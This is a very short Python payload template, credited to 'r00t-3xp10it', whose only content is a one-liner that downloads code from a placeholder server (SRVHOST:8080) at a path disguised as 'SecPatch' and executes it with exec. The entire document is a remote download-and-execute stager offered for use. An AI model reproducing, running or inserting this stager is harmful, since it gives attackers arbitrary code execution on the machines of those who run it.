# python  template | Author: r00t-3xp10it
# execute ./payload_name.py
# ---
python -c "import urllib2; r = urllib2.urlopen('http://SRVHOST:8080/SecPatch'); exec(r.read());"

